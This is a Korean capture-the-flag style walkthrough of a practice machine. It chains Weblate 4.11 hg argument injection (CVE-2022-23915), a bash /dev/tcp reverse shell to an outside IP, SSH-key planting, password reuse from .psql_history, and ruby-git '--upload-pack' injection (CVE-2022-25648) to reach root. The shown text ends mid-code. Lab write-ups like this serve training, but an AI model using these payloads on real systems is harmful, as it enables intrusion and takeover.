---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/cmd-injection
  - tech/exec/ssh-key
  - tech/cred/reuse
  - tech/lin/sudo-abuse
  - tech/payload/revshell
  - tech/web/info-disclosure
type: machine
platform: pg
os: linux
ip: 192.168.248.19
ports: [22, 80, 8000]
services: [http, ssh]
cves: [CVE-2022-23915, CVE-2022-25648]
status: solved
manual_tags: true
manual_cves: true
tech_count: 7
---

> [!info] Fikklish
> 타겟 192.168.248.19 · Ubuntu 22.04 · PG Practice **Fundamental** · 플래그 2개
> tcp/80 의 "Editors Note" 에서 Weblate admin 비번을 유추 → Weblate 4.11 의 hg 인자 주입(CVE-2022-23915)으로 tom 셸 → `.psql_history` 의 평문 비번 → `sudo /home/tom/fetch.rb` 가 쓰는 ruby-git 1.10.2 인자 주입(CVE-2022-25648)으로 root.
> `/home/tom/local.txt` · `/root/proof.txt`

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | 1장 nmap 블록 | `ssh-hostkey`·robots 항목 행을 말없이 잘라냈다 | `nmap.log` 원문으로 복원 |
> | 1장 gobuster | `javascript/` 를 403 이라 적었으나 실제 **301**, `/sass`·`/server-status` 누락 | `gobuster_80.txt`·`gobuster_80_big.txt` 대로 정정 |
> | 1장 mtime | "전부 2015~2016, index.html 만 2022-12-14" — 산출물에 헤더 비교 기록이 없다 | `[가정]` 강등 + 관측 없음 명시 |
> | 2장 패치 서술 | "4.11.1 이 `--` 구분자를 넣는 식으로 고쳤다" — 확인 불가 + 소스 고고학 | 버전 사실만 남기고 삭제 |
> | 3-2 ICMP | 12행 로그에서 3행만 비연속으로 이어 붙였다 | `icmp.log` 전문 복원 |
> | 3-3 리버스셸 | 첫 셸(`rev443`) 로그와 두 번째 셸(`rev443b`) 화면을 한 블록에 합쳤다 | 출처를 나눠 표기. 57430 은 `reg_smtp.pcap` 으로 교차확인 |
> | 3-3 `(900)` | "systemd 서비스의 PID" | `weblate runserver` **마스터 프로세스** PID (`harvest_root.txt:365`) |
> | 4장 `gem list` | Kali 프롬프트가 아닌 타겟 프롬프트를 붙였으나 그 캡처가 없다 | 출력만 남기고 출처를 정직하게 표기 |
> | 5장 플래그 | `Connection to ... closed.` 행을 잘라냈다 | `proof_*.txt` 원문 복원 |
> | 6장 도입 | "총 63분을 태우고 로그인" — 18:26 착수 → 19:19 로그인 = **53분** | 정정 (총 62분과의 산술 모순 해소) |
> | 6장 누락 | hydra SSH 브루트를 **실제로 두 번 돌렸는데** 노트에 없었다 | 6-2 로 추가 |
> | 남긴 흔적 | "`last` 에 우리 세션이 없다" — 실제로 2건 남았다 | `traces_confirmed.log` 대로 정정 |
> | 4장 추가 | tom 이 `lxd` 그룹인데 언급이 없었다 | 대안 경로로 추가(**시도하지 않음**, `[가정]`) |
> | 4장 `gem list` **(검증자 자책)** | 적대적 검증이 규율을 **반대로 적용해** 타겟 pty 프롬프트 `tom@fikklish:~$` 를 지웠다 | 원문 그대로 복원. Kali 프롬프트를 지우는 규율의 목적은 **없던 화면을 지어내지 않는 것**이지, 실제 대화형 셸의 표식을 지우는 것이 아니다 — 플래그를 웹셸이 아닌 대화형 셸에서 읽었다는 증거가 바로 그 프롬프트다 |

## 0. 이 박스에서 배우는 것

- **인자 주입(argument injection)** 두 번. 둘 다 "명령 문자열에 `;` 를 끼워넣는" 고전적 커맨드 인젝션이 아니라, **사용자 값이 외부 프로그램의 argv 한 칸으로 그대로 들어가서 옵션으로 해석되는** 유형이다. hg 의 `--config=alias.X=!cmd`, git 의 `--upload-pack=cmd`.
- **웹 본문이 곧 비밀번호 사전**이라는 것. cewl 로 뽑되, 어느 단어를 먼저 칠지는 본문이 정해준다.
- **레이트리밋이 걸린 로그인 폼에서 브루트포스는 도구가 아니라 손해**라는 것. Weblate 는 IP당 5회/5분 + 계정당 10회 실패시 비밀번호 무효화까지 건다.
- Django `DEBUG=True` 가 뿌리는 정보량. 여기서 OS 사용자명(`tom`), 설치 경로, DB/캐시/메일 설정이 전부 나왔다.
- **시험 출제 가능성**: OSCP 에 Weblate 가 그대로 나올 일은 없다. 전이되는 건 ① "이 파라미터가 CLI 인자로 들어가나?" 라는 반사 ② `sudo -l` 이 가리키는 스크립트의 **의존 라이브러리 버전**까지 보는 습관 ③ 홈 디렉터리의 `.*_history` 를 반드시 읽는 습관이다.

## 1. 정찰

### Nmap

```
ssh kali@10.44.44.128 "cd ~/PG/Fikklish && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.19"
```

```
Nmap scan report for 192.168.248.19
Host is up (0.085s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4e:eb:da:e8:00:da:40:3d:f4:22:ad:fb:41:2c:2a:4c (ECDSA)
|_  256 de:dc:7b:84:9e:6e:d8:fa:98:23:2b:9e:71:67:88:fe (ED25519)
80/tcp   open   http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Book Bargains Online
443/tcp  closed https
8000/tcp open   http    WSGIServer 0.2 (Python 3.10.12)
|_http-title:   Weblate
| http-robots.txt: 31 disallowed entries (15 shown)
| /admin/ /js/ /accounts/ /source/ /comment/ /commit/ 
| /update/ /push/ /reset/ /lock/ /unlock/ /changes/ /changes/csv/ 
|_/search/ /replace/
|_http-server-header: WSGIServer/0.2 CPython/3.10.12
```
출처: `~/PG/Fikklish/nmap.log` (PORT 절 전문. 앞뒤의 OS 추정·traceroute 는 생략)

robots 의 `/admin/` 이 뒤에 한 번 쓸모가 있다 — Django 관리자 폼이 별도 경로로 열려 있다는 뜻이고, 그걸 레이트리밋 우회로로 착각해 시간을 태웠다(6-1).

`WSGIServer/0.2` 는 Django 의 **개발 서버(`manage.py runserver`)** 다. 운영 배포라면 gunicorn/uwsgi 뒤에 nginx 가 붙는다. 이 한 줄이 "DEBUG 가 켜져 있을 수 있다" 는 첫 신호였고, 실제로 켜져 있었다.

UDP top-100 은 전부 `open|filtered`(무응답) 라 볼 것이 없었다.

### tcp/80 — 정적 템플릿, 그런데 본문이 손으로 고쳐져 있다

FreeHTML5 의 "Show" 무료 템플릿을 그대로 쓴 서점 사이트다. `gobuster` 를 `common.txt` 와 medium 목록으로 두 번 돌렸는데 나온 것은 전부 템플릿 구조물이다.

```
/index.html           (Status: 200) [Size: 18258]
/css                  (Status: 301)
/fonts                (Status: 301)
/images               (Status: 301)
/js                   (Status: 301)
/javascript           (Status: 301)
/sass                 (Status: 301)
/README.txt           (Status: 200) [Size: 759]
/server-status        (Status: 403)
/.htaccess /.htpasswd /.hta   (Status: 403)
```
출처: `~/PG/Fikklish/gobuster_80.txt` · `gobuster_80_big.txt` (두 실행의 합집합)

`README.txt` 도 템플릿 원본 그대로다 — `DESIGNED & DEVELOPED by FREEHTML5.co`. 403 인 `/server-status`·`.ht*` 는 Apache 기본 차단이라 볼 것이 없다. 결국 손댄 곳은 `index.html` 의 본문 텍스트뿐이다.

**[가정]** 처음에는 "정적 파일 mtime 은 전부 2015~2016 년인데 `index.html` 만 2022-12-14 로 혼자 최신"이라고 적었지만, **그 `Last-Modified` 비교를 남긴 산출물이 없다.** 판단 근거로 실제 남은 것은 README 원본과의 본문 대조뿐이다. 습관 자체는 유효하다(7장 3번) — 다만 이 박스에서 mtime 을 실제로 확인했다는 기록은 **관측 없음**이다.

그 본문에 템플릿에 없는 문단이 두 개 끼어 있다.

> Editors Note: As an editor for our online book store, I have had the pleasure of reading many wonderful books. But out of all of them, "The Time Traveler's Wife" by **Audrey Niffenegger** stands out as my absolute favorite.

> Multinational — We are excited to announce that we are in the process of **translating our website into over 10 different languages**.

두 번째 문단은 8000번 포트(번역 플랫폼)를 가리키는 표지판이고, 첫 번째는 "관리자의 최애 책" 이라는 전형적인 비밀번호 힌트다.

![[PG-Fikklish-port80-hint.png]]

### tcp/8000 — Weblate 4.11

버전 근거를 셋 교차했다. 정적 자산 쿼리스트링 `?v=4.11`, 헤더의 문서 링크 `docs.weblate.org/en/weblate-4.11/`, 푸터의 `Powered by Weblate 4.11`. 배너 하나가 아니라 서로 다른 세 곳에서 같은 값이 나왔으니 백포트 오독일 가능성은 접어도 된다.

![[PG-Fikklish-weblate411.png]]

익명으로 REST API 를 읽을 수 있다(`DEFAULT_PERMISSION_CLASSES` 가 `IsAuthenticatedOrReadOnly`).

```
ssh kali@10.44.44.128 "curl -s 'http://192.168.248.19:8000/api/users/?format=json'"
```
```
{"count":2,"next":null,"previous":null,"results":[{"full_name":"Anonymous","username":"anonymous"},{"full_name":"Weblate Admin","username":"admin"}]}
```

`/api/projects/`·`/api/components/` 는 `count:0`. **사용자는 `admin` 하나, 프로젝트는 0개**. 이 두 사실이 뒤의 전략을 전부 결정했다 — 붙을 계정이 admin 밖에 없고, 익명이 건드릴 데이터도 없다.

### Django DEBUG=True — 여기서 사용자명이 나왔다

없는 경로를 치면 Django 의 technical 404(URLconf 221개를 나열하는 그 페이지)가 뜬다. DEBUG 가 켜져 있다는 뜻이다. 더 쓸모 있는 건 **technical 500** 인데, 예외를 하나 일으켜야 한다. DEBUG 모드에서 `/media/<path>` 는 `django.views.static.serve` 가 처리하므로 여기에 트래버설을 던지면 `SuspiciousFileOperation` 이 올라온다.

```
ssh kali@10.44.44.128 "curl -s --path-as-is 'http://192.168.248.19:8000/media/%2e%2e%2f%2e%2e%2fsecret' -o ~/PG/Fikklish/debug_traceback.html"
```

`--path-as-is` 가 핵심이다. 이게 없으면 **curl 이 클라이언트 쪽에서 `..` 를 먼저 정규화해버려** 서버에는 `/secret` 이 도착하고, 그냥 404 가 돌아온다. 인코딩(`%2e%2e%2f`)만으로는 부족하고 둘 다 필요하다.

돌아온 113KB 짜리 페이지에서:

```
The joined path (/home/tom/.local/lib/python3.10/site-packages/secret) is located
outside of the base path component (/home/tom/.local/lib/python3.10/site-packages/data/media)
```
출처: `~/PG/Fikklish/debug_traceback.html`

**`tom`** 이라는 OS 사용자명과 설치 경로가 여기서 나왔다. 페이지 하단의 Settings 표에서 더 나온다(전문은 `~/PG/Fikklish/settings_dump.txt`):

| 설정 | 값 | 왜 중요한가 |
|---|---|---|
| `DEBUG` | `True` | 이 페이지 자체의 원인 |
| `BASE_DIR` | `/home/tom/.local/lib/python3.10/site-packages` | pip `--user` 설치 |
| `DATABASES` | postgresql @ 127.0.0.1 / weblate | 비번은 `***` 로 가려짐 |
| `EMAIL_HOST` / `PORT` | `localhost` / `25` | 메일 가로채기를 시도하게 만든 함정 (→ 6장) |
| `REGISTRATION_OPEN` | `True` | 가입은 열려 있다 |
| `AUTH_LOCK_ATTEMPTS` | `10` | **계정당 10회 실패면 비번이 무효화된다** |
| `RATELIMIT_ATTEMPTS` | `5` | IP당 5회/5분 |
| `IP_BEHIND_REVERSE_PROXY` | `False` | `X-Forwarded-For` 로는 레이트리밋을 못 피한다 |

Django 의 technical 500 은 `META` 도 통째로 보여주는데, `wsgiref` 가 WSGI environ 에 프로세스 환경변수를 섞어 넣기 때문에 `USER='tom'`, `HOME='/home/tom'`, `SERVER_NAME='fikklish'` 까지 함께 나온다.

![[PG-Fikklish-django-debug.png]]

## 2. 취약점 분석 — CVE-2022-23915

### 인자 주입이란

셸 메타문자를 넣는 커맨드 인젝션과 다르다. 프로그램이 `subprocess`(shell=False)로 안전하게 호출하더라도, **사용자 값이 argv 한 칸을 통째로 차지하면** 대상 프로그램이 그걸 "옵션" 으로 해석할 수 있다. 값이 `-` 로 시작하기만 하면 된다. git·hg·curl·tar 처럼 옵션이 풍부한 CLI 를 감싸는 웹앱은 전부 후보다.

Weblate 4.11 이하는 컴포넌트의 **저장소 URL과 브랜치명**을 git/mercurial 인자로 그대로 넘긴다. 4.11.1 에서 수정됐다.

### 왜 이 페이로드인가

```
--config=alias.pull=!ping -c 3 192.168.45.207
```

조각내면:

| 조각 | 역할 |
|---|---|
| `--config=` | 브랜치명이 hg 의 **옵션**으로 해석되게 만드는 부분. `-` 로 시작하는 것이 전부다 |
| `alias.pull=` | hg 설정의 alias 섹션에 `pull` 이라는 별칭을 정의 |
| `!` | hg alias 문법에서 **"뒤는 셸 명령"** 을 뜻하는 접두사 |
| `ping -c 3 ...` | 실행될 명령 |

Weblate 는 컴포넌트를 저장할 때 저장소를 실제로 clone/pull 해보므로(`component.clean_repo()` → `sync_git_repo(validate=True)`) `hg pull` 이 불리고, 그 순간 우리 별칭이 실행된다. **컴포넌트 생성은 실패하지만 명령은 그 전에 이미 돌아간 뒤**다. 응답이 실패라고 익스플로잇이 실패한 게 아니다.

실패 사유는 시도마다 달랐다. `journalctl -u weblate` 에 남은 것은 `weblate.utils.lock.WeblateLockTimeout`(같은 slug 로 반복 생성할 때 저장소 락이 안 풀린 경우)이고, 첫 시도가 어떤 예외로 끝났는지는 **저널 tail 밖이라 관측 없음**이다. 어느 쪽이든 판정은 응답이 아니라 `tcpdump` 로 한다.
출처: `~/PG/Fikklish/traces_confirmed.log` 의 `WEBLATE LOG TAIL`

## 3. Foothold

### 3-1. 로그인

`admin` 하나뿐이므로 비밀번호만 맞추면 된다. 웹 본문에서 사전을 만든다.

```
ssh kali@10.44.44.128 "cd ~/PG/Fikklish && cewl -d 1 -m 5 -c http://192.168.248.19/ -w cewl.txt"
```

`-c` 로 빈도를 함께 뽑으면 `Traveler, 8 / Henry, 8 / Clare, 6 / Audrey, 4 / Niffenegger, 4` 가 보인다(출처: `~/PG/Fikklish/cewl.txt`). 348 단어짜리 사전이지만 **이걸 통째로 먹여봐야 소용이 없었다** — 웹 폼은 레이트리밋에 걸리고, SSH 로 우회해 hydra 를 돌린 것도 실패했다(6-2). 게다가 `-c` 를 쓰면 파일이 `Niffenegger, 4` 형식이라 그대로 `-P` 에 넣으면 **틀린 문자열을 시험하게 된다.** Editors Note 가 지목한 고유명사를 손으로 골라야 한다.

정답은 소문자 그대로였다 — **`admin:niffenegger`**.

```
ssh kali@10.44.44.128 "/tmp/one.sh admin niffenegger"
```
```
[admin:niffenegger] 302|http://192.168.248.19:8000/ msg=
```

로그인 성공은 **302** 로 판정한다. Django 의 `LoginView` 는 실패하면 폼을 200 으로 다시 그리므로, 200/302 만 보면 본문을 파싱할 필요가 없다.

### 3-2. RCE

`~/PG/Fikklish/wl_rce.py` 가 로그인 → 프로젝트 생성 → 컴포넌트 생성을 한 번에 한다. 폼 필드 요지는:

| 필드 | 값 |
|---|---|
| `vcs` | `mercurial` |
| `repo` | `http://localhost:8000` |
| `branch` | `--config=alias.pull=!<명령>` |
| `project` | `1` (앞서 만든 poc) |
| `source_language` | 페이지의 `<option>` 에서 English 의 pk 를 파싱해서 채운다 |

먼저 ICMP 로 실행 여부만 확인했다. 리버스셸을 바로 던지면 "실행이 안 된 것" 과 "아웃바운드가 막힌 것" 을 구별할 수 없다.

```
ssh kali@10.44.44.128 "python3 ~/PG/Fikklish/wl_rce.py 'ping -c 3 192.168.45.207' pocping"
```
```
19:19:22.277392 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 1, length 64
19:19:22.278412 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 1, length 64
19:19:23.277663 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 2, length 64
19:19:23.277699 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 2, length 64
19:19:24.278143 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 1, seq 3, length 64
19:19:24.278172 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 1, seq 3, length 64
19:19:24.798284 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 1, length 64
19:19:24.798339 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 1, length 64
19:19:25.798473 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 2, length 64
19:19:25.798503 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 2, length 64
19:19:26.800575 IP 192.168.248.19 > 192.168.45.207: ICMP echo request, id 2, seq 3, length 64
19:19:26.800609 IP 192.168.45.207 > 192.168.248.19: ICMP echo reply, id 2, seq 3, length 64
```
출처: `~/PG/Fikklish/icmp.log` 전문 (`tcpdump -i tun0 -n icmp`)

`ping -c 3` 을 한 번 시켰는데 **`id` 가 1 과 2 로 각각 seq 1~3 씩, 즉 두 번 완주했다.** ping 프로세스가 두 개 떴다는 뜻이다. **[가정]** 원인은 Weblate 가 컴포넌트 검증 과정에서 hg 를 두 번 부르기 때문으로 보이지만, 호출 횟수를 직접 센 기록은 없다. 어느 쪽이든 실무상 의미는 하나다 — **한 번 넣은 페이로드가 여러 번 실행될 수 있으니 리버스셸을 넣기 전에 ICMP 로 횟수를 먼저 본다.**

### 3-3. 리버스셸

```
ssh kali@10.44.44.128 "python3 ~/PG/Fikklish/wl_rce.py \"bash -c 'bash -i >& /dev/tcp/192.168.45.207/443 0>&1'\" rev443b"
```

443 으로 붙었다. 셸이 열릴 때 나오는 두 줄은 첫 번째 컴포넌트(`rev443`)의 리스너 로그에 그대로 남아 있다.

```
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
</lib/python3.10/site-packages/data/vcs/poc/rev443$ 
```
출처: `~/PG/Fikklish/shell443.log` (파일은 여기서 끝난다 — 아래 6-5 의 `| tee` 버퍼링 때문에 그 뒤가 안 담겼다)

실제로 명령을 친 것은 두 번째 셸(`rev443b`)이다. 그쪽은 `tmux capture-pane` 화면이 전부이고 **파일로는 남기지 않았다.** 프롬프트가 `rev443b$` 로 바뀐 것이 두 셸을 가르는 표식이다.

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.19] 57430
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
<lib/python3.10/site-packages/data/vcs/poc/rev443b$ id; whoami; hostname; hostname -I; date -u
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
tom
fikklish
192.168.248.19
Thu Aug 20 10:25:44 UTC 2026
```

소스 포트 `57430` 은 `~/PG/Fikklish/reg_smtp.pcap` 에 그대로 있다 — `19:25:26.171960 IP 192.168.248.19.57430 > 192.168.45.207.443: Flags [S]`. 셸 안에서 찍은 `date -u` 의 `10:25:44 UTC` 는 KST 19:25:44, 그 SYN 으로부터 18초 뒤다. 두 출처가 서로를 맞춰준다.

`(900)` 은 Weblate 를 띄운 **`runserver` 마스터 프로세스의 PID** 다.

```
tom  900  0.0  0.5 252664  5204 ?  Ss  09:23  0:01 /usr/bin/python3 /home/tom/.local/bin/weblate runserver 0.0.0.0:8000
```
출처: `~/PG/Fikklish/harvest_root.txt`

즉 우리 셸이 웹 프로세스의 프로세스 그룹 안에서 태어났다는 뜻이다. `cannot set terminal process group` 은 고장 신호가 아니라 **"pty 없이 붙었다"** 는 표시일 뿐이다.

### 3-4. SSH 키로 안정화

```
mkdir -p /home/tom/.ssh; chmod 700 /home/tom/.ssh
echo '<pubkey>' >> /home/tom/.ssh/authorized_keys; chmod 600 /home/tom/.ssh/authorized_keys
```

**`~` 를 쓰면 안 된다.** Weblate 는 VCS 작업용으로 `HOME` 을 `DATA_DIR/home` 으로 바꿔 놓기 때문에, `~/.ssh/authorized_keys` 는 `/home/tom/.local/lib/python3.10/site-packages/data/home/.ssh/authorized_keys` 로 떨어진다. 처음에 이걸로 한 번 헛짚었다. 절대경로로 다시 심으니 붙었다.

## 4. 권한상승 — CVE-2022-25648

### 열거

셸을 잡자마자 `~/PG/_lib/harvest.sh` 를 tom 권한으로 돌렸다(`harvest_tom.txt`). tom 의 홈이 그대로 답이었다.

```
-rwxr-xr-x 1 root root  186 Apr 25  2025 checkout.rb
-rwxr-xr-x 1 root root  260 Apr 25  2025 fetch.rb
-rw------- 1 tom  tom   175 Apr 25  2025 .psql_history
lrwxrwxrwx 1 root root    9 Apr 25  2025 .bash_history -> /dev/null
```

`.bash_history` 는 `/dev/null` 로 링크돼 있는데 **`.psql_history` 는 살아 있다**. 히스토리 파일을 지울 때 셸 것만 챙기고 클라이언트 것을 빠뜨리는 전형이다. (`/root/.bash_history` 도 같은 링크라는 것은 나중에 root 로 확인했다 — `traces_confirmed.log` 의 `HISTORY FILES`.)

```
GRANT ALL PRIVILEGES ON DATABASE WEBLATE to WEBLATE;
ALTER USER WEBLATE PASSWORD 'RapidlyLockstepDrenched103';
q
\q
ALTER USER WEBLATE PASSWORD 'RollingShockingLifter231';
\q
```
출처: tom SSH 세션에서 `cat /home/tom/.psql_history`. **그 세션 화면은 저장하지 않았다** — 두 값이 실재했다는 방증은 `~/PG/Fikklish/trysudo.sh`(둘을 순서대로 시험한다)와 `traces_confirmed.log` 의 `/root/projects/RapidlyLockstepDrenched103` 디렉터리다.

DB 비번인데 **tom 의 시스템 비번으로 재사용**돼 있었다. `sudo -n -l` 은 "a password is required" 만 뱉으므로 여기서 멈추면 안 된다 — 비번을 손에 넣었으면 다시 물어봐야 한다.

```
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
-- sudo -S -l (HARVEST_PW) --
[sudo] password for tom: Matching Defaults entries for tom on fikklish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tom may run the following commands on fikklish:
    (ALL) /home/tom/checkout.rb
    (ALL) /home/tom/fetch.rb
```
출처: `~/PG/Fikklish/harvest_tom.txt` (`HARVEST_PW=RapidlyLockstepDrenched103 sh harvest.sh`)

### 왜 그것이 권한상승이 되는가

두 스크립트는 root 소유지만 **내용은 평범하다.** 취약한 건 스크립트가 아니라 그것이 쓰는 gem 이다.

```ruby
#!/usr/bin/ruby
require 'git'
name = gets
g = Git.init('/root/projects/' + name.chomp)
origin = gets
ref = gets
g.fetch(origin.chomp, {:ref => ref.chomp} )
```

```
tom@fikklish:~$ gem list git
git (1.10.2)
```
출처: tom 의 대화형 셸. 이 화면을 파일로 떠 두지는 않았지만, 같은 값이 `~/PG/Fikklish/privesc.sh` 주석(`ruby-git 1.10.2`)과 익스플로잇 실패 메시지의 경로 `gems/git-1.10.2/lib/git/lib.rb` 로 두 번 더 확인된다.

ruby-git 1.10.2 는 `fetch` 를 `git fetch <origin> <ref>` 로 조립하면서 두 값 모두 검증하지 않는다(CVE-2022-25648). git 에는 `--upload-pack=<cmd>` 옵션이 있고, **원격이 로컬 경로로 해석되는 전송(local transport)에서는 git 이 그 명령을 직접 실행**한다. 그래서 값 하나를 옵션으로 만들면 root 로 임의 명령이 돈다.

이 동작은 타겟과 무관하게 재현된다(git 2.50 에서 확인):

```
$ cd /tmp && mkdir audtest && cd audtest && git init -q .
$ git fetch poc --upload-pack='sh -c "touch /tmp/aud_hit"'
fatal: Could not read from remote repository.
$ ls /tmp/aud_hit
-rw-r--r-- 1 ... 0 ... /tmp/aud_hit
```

`poc` 라는 원격은 존재하지 않아 **fatal 로 끝나는데 파일은 만들어져 있다.** 아래에서 이 박스가 정확히 이 모양으로 뚫린다.

`sudo -l` 에서 스크립트가 나오면 스크립트 본문만 읽고 끝내지 마라. **`require`/`import` 한 라이브러리의 버전**까지 봐야 한다. 여기서는 `gem list git` 한 줄이 전부였다.

### 실행

```
printf '<pw>\npoc\n--upload-pack=sh /tmp/r.sh\n/root/projects/poc\n' | sudo -S /home/tom/fetch.rb
```

`/tmp/r.sh` 는 root 의 `authorized_keys` 에 우리 공개키를 넣는다. 실행된 실제 명령은 ruby 의 예외 메시지에 통째로 찍혔다:

```
/var/lib/gems/3.0.0/gems/git-1.10.2/lib/git/lib.rb:1115:in `command': git '--git-dir=/root/projects/RapidlyLockstepDrenched103/.git' '--work-tree=/root/projects/RapidlyLockstepDrenched103' '-c' 'core.quotePath=true' '-c' 'color.ui=false' fetch 'poc' '--upload-pack=sh /tmp/r.sh'  2>&1:fatal: Could not read from remote repository. (Git::GitExecuteError)
```

그리고 `/tmp/whoami_check`:

```
uid=0(root) gid=0(root) groups=0(root)
```

두 가지가 눈에 띈다. 첫째, **`fetch` 는 실패했는데 명령은 이미 실행됐다** — 여기서도 "응답 실패 ≠ 익스플로잇 실패". 둘째, 입력이 한 칸씩 밀려서 프로젝트명 자리에 비밀번호가, ref 자리에 우리 페이로드가 들어갔는데도 통했다. `sudo` 가 직전 호출의 자격 캐시를 써서 stdin 의 첫 줄을 소비하지 않았기 때문이고, git 은 옵션의 **위치를 가리지 않으므로** `--upload-pack=` 이 ref 자리에 있어도 옵션으로 먹었다. 운이 좋았던 게 아니라 인자 주입이 원래 위치에 둔감하다.

`checkout.rb` 도 같은 gem 의 `checkout(branch)` 를 쓰므로 같은 방식으로 뚫린다. 경로는 둘 다 유효하고, `fetch` 쪽이 `--upload-pack` 이라는 확실한 실행 훅을 쥐고 있어 더 안정적이다.

### 안 써먹은 세 번째 경로 — tom 이 `lxd` 그룹이다

셸을 잡자마자 찍은 `id` 를 다시 본다.

```
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

`110(lxd)`. **[가정] — 이 박스에서는 시도하지 않았다.** lxd 그룹은 사실상 root 와 동등하게 취급되는 대표적인 그룹이다. lxd 데몬이 root 로 도는 상태에서 그룹 멤버는 컨테이너를 만들 수 있고, 컨테이너에 호스트 루트(`/`)를 `security.privileged=true` 로 마운트해 붙이면 컨테이너 안의 root 로 호스트 파일을 그대로 쓸 수 있다. `sudo` 가 아예 없거나 비번을 못 구했다면 이쪽이 다음 후보였다.

확인하지 않은 것 — 이 박스에 **lxd 데몬이 실제로 떠 있었는지, 사용 가능한 이미지가 있었는지는 보지 않았다.** 그룹 멤버십만으로 성립하는 경로가 아니다. `sudo -l` 이 이미 열려 있어서 여기까지 가지 않았다.

시험장에서 값나가는 건 결론이 아니라 습관 쪽이다. **`id` 는 uid 만 보고 지나가기 쉬운데, 뒤쪽 `groups=` 가 별도의 경로 목록이다.** `lxd`·`docker`·`disk`·`adm`·`shadow`·`sudo` 는 각각 다른 길이고, 이 계정은 `adm` 도 갖고 있어 `/var/log` 를 읽을 수 있었다.

## 5. 플래그

⚠️ 아래 값은 **2026-08-20 인스턴스** 것이다. PG 는 박스를 다시 켤 때마다 새로 만든다.

user — `/home/tom/local.txt`

```
tom
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
fikklish
192.168.248.19 
Thu Aug 20 10:26:46 AM UTC 2026
f7839e08cb34410ad9e665421c7873ea
Connection to 192.168.248.19 closed.
```
출처: `~/PG/Fikklish/proof_user.txt` 전문 (`ssh -tt -i fik_key tom@192.168.248.19`)

root — `/root/proof.txt`

```
root
uid=0(root) gid=0(root) groups=0(root)
fikklish
192.168.248.19 
Thu Aug 20 10:28:48 AM UTC 2026
7c3828a8fc14c10f1ccba90127c3a3bc
Connection to 192.168.248.19 closed.
```
출처: `~/PG/Fikklish/proof_root.txt` 전문 (`ssh -tt -i fik_key root@192.168.248.19`)

둘 다 표준 위치다. 미끼 파일은 없었다. `ssh -tt` 로 pty 를 강제해 대화형 셸에서 원위치 `cat` 한 결과다 — 웹셸로 읽은 값은 시험에서 0점이다.

타겟의 `date` 는 UTC 로 돌고 Kali 는 KST 라 **로그를 대조할 때 9시간을 환산해야 한다.** 위 `10:26:46 UTC` 는 Kali 산출물 mtime 의 `19:26:46` 과 같은 순간이다.

## 6. 막혔던 지점 / 시행착오

nmap 을 건 18:26 부터 `admin` 으로 로그인한 19:19 까지 **53분**이 걸렸다. 그 뒤 RCE → tom → root 는 **9분**이다(19:28). 태운 시간의 정체가 이 장이다. 아래 각 항목의 소요는 서로 겹친다 — 레이트리밋을 기다리는 동안 다른 걸 돌렸기 때문이라 합계는 53분을 넘는다.

### 6-1. 비밀번호를 브루트포스로 풀려다 계정을 죽일 뻔했다 (약 45분)

Editors Note 를 본 직후 후보 8개를 만들어 `curl` 로 순서대로 던졌다. **다섯 번째에서 막혔다.**

```
Too many authentication attempts from this location. Please try again in 10 minutes.
```

여기서 세 번 연속으로 잘못 판단했다.

1. **`X-Forwarded-For` 로 우회하려 했다.** 실패. 나중에 설정 덤프에서 `IP_BEHIND_REVERSE_PROXY = False` 를 확인했고, 소스(`weblate/utils/request.py`)도 그 경우 `REMOTE_ADDR` 을 그대로 쓴다. **추측으로 시도하고 소스로 확인하는 순서가 거꾸로였다.**
2. **재시도 루프를 돌렸다.** `weblate/utils/ratelimit.py` 를 읽어보니 잠금 상태에서의 시도가 `cache.set(key, attempts, LOCKOUT)` 으로 **락아웃 타이머를 매번 새로 감는다.** 기다리는 대신 두드린 탓에 스스로 10분을 계속 연장하고 있었다. 루프를 죽이고 조용히 기다리는 것이 유일한 해법이었다.
3. **Django admin 로그인이 별도 경로일 거라 기대했다.** `/admin/login/` 이 Weblate 화면이 아니라 Django 관리자 폼이길래 우회로인 줄 알았다. 존재하지 않는 계정으로 12회 시험한 결과 5회째부터 같은 메시지가 떴다. 소스를 보니 `weblate/wladmin/sites.py` 가 `login_form = AdminLoginForm` 을 지정하고 `AdminLoginForm(LoginForm)` 이라 **같은 레이트리밋을 탄다.** 존재하지 않는 계정으로 먼저 떠본 건 잘한 판단이었다 — 실재 계정으로 시험했으면 다음 항목에 걸렸다.

그리고 정말 위험했던 것:

```python
if self.activity == "failed-auth" and self.user.has_usable_password():
